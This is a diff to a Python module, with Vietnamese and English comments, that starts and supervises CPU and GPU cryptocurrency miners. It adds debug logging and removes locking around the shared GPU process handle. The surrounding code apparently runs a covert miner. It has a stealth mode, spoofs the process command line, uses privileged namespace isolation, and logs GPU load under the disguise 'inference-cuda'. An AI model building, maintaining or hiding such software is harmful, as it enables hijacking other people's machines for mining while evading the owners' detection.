@@ -325,6 +325,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
 
     for attempt in range(1, retries + 1):
         logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần thử {attempt}/{retries})...")
+        # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
+        if not cpu:
+            logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
+            logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
         try:
             # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth and cpu:
@@ -345,6 +349,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         logger.warning(f"⚠️ Không thể spoof cmdline: {e}")
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
+                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using namespace isolation")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -354,6 +359,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 )
             else:
                 # **Standard subprocess** (tiến trình con tiêu chuẩn)
+                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using standard subprocess")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -365,6 +371,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
             if process:
                 startup_time = time.time()
                 miner_type = 'CPU' if cpu else 'GPU'
+                logger.info(f"🔍 {miner_type} process created successfully with PID: {process.pid}")
                 
                 # **Enhanced startup logging** (ghi log khởi động nâng cao)
                 startup_msg = (f"🚀 MINING PROCESS STARTED [{miner_type}]\n"
@@ -459,6 +466,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     
         except Exception as e:
             logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
+            # **Additional debug info** (thông tin gỡ lỗi bổ sung) cho **GPU failures** (lỗi GPU)
+            if not cpu:
+                logger.error(f"🔍 GPU Error Details - Exception: {type(e).__name__}: {str(e)}")
+                logger.error(f"🔍 GPU Error Details - Command: {' '.join(mining_command)}")
             process = None
         if attempt < retries:
             logger.info(f"Đợi {delay} giây trước khi thử lại...")
@@ -507,16 +518,24 @@ def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
     """
     global gpu_process
     retries = 0
+    logger.info("🔍 GPU Manager - Starting manage_gpu_miner function")
+    logger.info(f"🔍 GPU Manager - Initial state: stop_event={stop_event.is_set()}, retries={retries}, max_retries={max_retries}")
     while not stop_event.is_set() and retries < max_retries:
-        with process_lock:
-            process = gpu_process
-        if not is_mining_process_running(process):
+        logger.info(f"🔍 GPU Manager - Loop iteration: stop_event={stop_event.is_set()}, retries={retries}")
+        # **Direct access** (truy cập trực tiếp) để **avoid deadlock** (tránh khóa chết)
+        process = gpu_process
+        logger.info(f"🔍 GPU Manager - Checking process status: {process}")
+        is_running = is_mining_process_running(process)
+        logger.info(f"🔍 GPU Manager - is_mining_process_running returned: {is_running}")
+        if not is_running:
             if process:
                 logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
                 retries += 1
+            logger.info("🔍 GPU Manager - Attempting to start GPU mining process...")
             new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
-            with process_lock:
-                gpu_process = new_process
+            logger.info(f"🔍 GPU Manager - start_mining_process returned: {new_process}")
+            # **Direct assignment** (gán trực tiếp) để **avoid deadlock** (tránh khóa chết)
+            gpu_process = new_process
         else:
             # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **GPU mining** (khai thác GPU)
             log_resource_usage("inference-cuda", force_gpu_check=True)
